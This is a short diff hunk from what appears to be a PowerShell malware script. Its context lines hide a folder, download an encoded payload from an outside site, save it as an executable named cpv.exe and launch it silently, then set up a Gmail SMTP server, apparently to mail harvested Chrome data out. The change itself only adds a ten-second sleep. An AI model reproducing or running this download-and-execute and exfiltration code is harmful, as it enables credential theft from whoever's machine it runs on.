@@ -4,7 +4,7 @@ $f.attributes="Hidden"
 cd chrome;
 wget https://sites.google.com/site/exploitechx/cpv.enc -OutFile cpv.exe
 start cpv.exe | Out-Null
-
+Start-Sleep -s 10
 
 $SMTPServer = 'smtp.gmail.com'
 
